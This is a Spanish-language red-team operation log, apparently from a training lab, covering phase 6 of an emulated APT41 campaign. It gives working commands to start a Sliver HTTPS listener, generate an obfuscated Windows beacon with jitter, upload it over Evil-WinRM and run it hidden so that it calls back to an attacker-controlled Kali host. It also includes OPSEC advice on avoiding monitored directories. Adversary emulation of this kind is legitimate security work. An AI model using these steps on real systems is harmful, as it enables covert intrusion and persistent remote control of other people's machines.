# C2 Sliver — Operación SILENT BRIDGE
## Fase 6 — Command & Control: Beacon en red interna
**Operación:** SILENT BRIDGE | **Adversario:** APT41 | **Framework:** MITRE ATT&CK v14  
**Operador:** Adrián Camacho | **Fecha:** —  
**Objetivo:** Beacon Sliver activo en PC Windows — C2 a través del túnel Ligolo-ng

---

## FASE 6 — C2 Establishment: Sliver

**Táctica MITRE:** TA0011 — Command and Control  
**Técnicas:**
- T1071.001 — Application Layer Protocol: Web Protocols (HTTPS)
- T1573.002 — Encrypted Channel: Asymmetric Cryptography
- T1587.001 — Develop Capabilities: Malware (beacon generado)

### Contexto táctico

APT41 despliega implantes C2 en los endpoints comprometidos de la red interna para mantener acceso persistente e interactivo independientemente del vector de entrada inicial. El beacon Sliver se configura para comunicar hacia Kali a través del túnel Ligolo-ng ya establecido — el PC Windows no tiene visibilidad directa hacia Kali, pero el routing del túnel hace transparente esta comunicación.

> **Arquitectura de C2:** `PC Windows → (red interna) → PROD (agent Ligolo) → (túnel TLS) → Kali (proxy Ligolo + Sliver listener)`

---

### 6.1 — Configurar listener Sliver en Kali
**Captura:** `fase6-01-sliver-listener.png`

```bash
# Abrir consola Sliver (si no está abierta)
sliver

# Verificar jobs activos (posible listener del Lab-01)
sliver > jobs

# Crear listener HTTPS en la IP de Kali
sliver > https -L 10.0.2.9 -l 443

# Verificar
sliver > jobs
```

**Output esperado:**
```
[*] Starting HTTPS :443 listener ...
[+] Successfully started job #X

ID  Name   Protocol  Port
X   https  tcp       443
```

---

### 6.2 — Generar beacon para Windows
**Captura:** `fase6-02-sliver-beacon-generated.png`

```bash
sliver > generate beacon \
  --http 10.0.2.9:443 \
  --os windows \
  --arch amd64 \
  --format exe \
  --seconds 60 \
  --jitter 15 \
  --save /tmp/beacon_wreath.exe
```

**Parámetros:**

| Parámetro | Valor | Razón |
|-----------|-------|-------|
| `--http` | `10.0.2.9:443` | IP Kali — alcanzable vía túnel Ligolo |
| `--os` | `windows` | Target es PC Windows |
| `--seconds 60` | 60s check-in | Balance detección/interactividad |
| `--jitter 15` | ±15s variación | Evita patrón de beaconing fijo |
| `--format exe` | ejecutable | Transferencia simple via Evil-WinRM |

**Output:**
```
[*] Generating new windows/amd64 beacon implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in ...
[*] Implant saved to /tmp/beacon_wreath.exe
```

**Nombre del beacon generado:** `___________`

---

### 6.3 — Transferencia y ejecución en PC Windows
**Captura:** `fase6-03-beacon-upload-exec.png`

```bash
# Conectar a PC via Evil-WinRM (a través del túnel)
evil-winrm -i <PC_IP> -u <usuario> -p '<contraseña>'
```

```powershell
# Subir beacon
upload /tmp/beacon_wreath.exe

# Verificar
dir beacon_wreath.exe

# Ejecutar en background (sin ventana visible)
Start-Process -FilePath ".\beacon_wreath.exe" -WindowStyle Hidden
```

> **OPSEC:** Directorio de ejecución — evitar `C:\Windows\Temp` (monitorizado). Usar `C:\Users\<usuario>\AppData\Local\` o directorio de trabajo del usuario.

---

### 6.4 — Beacon conectado
**Captura:** `fase6-04-sliver-session-active.png`

```bash
# En consola Sliver — beacon entrante
[*] Beacon XXXXXXXXXX <nombre> - <PC_IP>:<puerto> (<hostname>) - windows/amd64 - ...
```

```bash
# Listar beacons activos
sliver > beacons

# Seleccionar beacon
sliver > use <beacon_id>

# Verificar identidad
sliver (<nombre>) > whoami
sliver (<nombre>) > pwd
sliver (<nombre>) > ps | grep -i explorer
```

**Beacon activo:**

| Campo | Valor |
|-------|-------|
| Beacon ID | — |
| Nombre | — |
| Host | — |
| Usuario | — |
| Check-in interval | 60s ±15s |
| Protocolo | HTTPS |

---

### Resumen Fase 6

```
C2 ESTABLISHMENT — Estado final
════════════════════════════════════════════════════

PC WINDOWS (<PC_IP>)
  Beacon Sliver     → <nombre> (<ID>) ✅/⏳
  Protocolo C2      → HTTPS :443 ✅/⏳
  Routing           → vía túnel Ligolo-ng ✅/⏳
  Process Integrity → [High/Medium]

TÉCNICAS MITRE EJECUTADAS:
  T1587.001 → Develop Capabilities: beacon generado con obfuscación
  T1105     → Ingress Tool Transfer (beacon a PC vía Evil-WinRM)
  T1204.002 → User Execution: Malicious File (Start-Process Hidden)
  T1071.001 → C2 via HTTPS
  T1573.002 → Encrypted Channel (Sliver mTLS)
```

---

**Siguiente fase:** [persistence.md](persistence.md) — Fase 7: Persistencia y objetivo final